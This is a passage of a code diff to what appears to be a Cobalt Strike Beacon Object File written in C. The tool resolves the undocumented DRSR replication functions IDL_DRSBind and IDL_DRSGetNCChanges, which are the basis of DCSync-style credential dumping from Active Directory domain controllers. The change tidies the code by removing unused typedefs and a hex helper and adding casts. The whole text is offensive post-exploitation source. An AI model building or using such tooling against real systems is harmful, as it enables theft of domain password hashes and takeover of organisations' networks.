@@ -176,22 +176,6 @@ typedef ULONG (*IDL_DRSGetNCChanges_fn)(
     void *pmsgOut             /* DRS_MSG_GETCHGREPLY* */
 );
 
-typedef ULONG (*IDL_DRSCrackNames_fn)(
-    void *hDrs,
-    DWORD dwInVersion,
-    void *pmsgIn,             /* DRS_MSG_CRACKREQ* */
-    DWORD *pdwOutVersion,
-    void *pmsgOut             /* DRS_MSG_CRACKREPLY* */
-);
-
-typedef ULONG (*IDL_DRSUnbind_fn)(
-    void **phDrs
-);
-
-static void bytes_to_hex(const unsigned char *data, int len, char *out) {
-    for (int i = 0; i < len; i++)
-        MSVCRT$snprintf(out + i * 2, 3, "%02x", data[i]);
-}
 
 void go(char *args, int args_len) {
     datap parser;
@@ -369,13 +353,9 @@ void go(char *args, int args_len) {
     }
 
     /* Try to resolve the internal DRSR stubs */
-    IDL_DRSBind_fn pDRSBind = (IDL_DRSBind_fn)KERNEL32$GetProcAddress(hDrsr, "IDL_DRSBind");
+    IDL_DRSBind_fn pDRSBind = (IDL_DRSBind_fn)(void *)KERNEL32$GetProcAddress(hDrsr, "IDL_DRSBind");
     IDL_DRSGetNCChanges_fn pDRSGetNCChanges =
-        (IDL_DRSGetNCChanges_fn)KERNEL32$GetProcAddress(hDrsr, "IDL_DRSGetNCChanges");
-    IDL_DRSCrackNames_fn pDRSCrackNames =
-        (IDL_DRSCrackNames_fn)KERNEL32$GetProcAddress(hDrsr, "IDL_DRSCrackNames");
-    IDL_DRSUnbind_fn pDRSUnbind =
-        (IDL_DRSUnbind_fn)KERNEL32$GetProcAddress(hDrsr, "IDL_DRSUnbind");
+        (IDL_DRSGetNCChanges_fn)(void *)KERNEL32$GetProcAddress(hDrsr, "IDL_DRSGetNCChanges");
 
     if (!pDRSBind || !pDRSGetNCChanges) {
         BeaconPrintf(CALLBACK_OUTPUT,
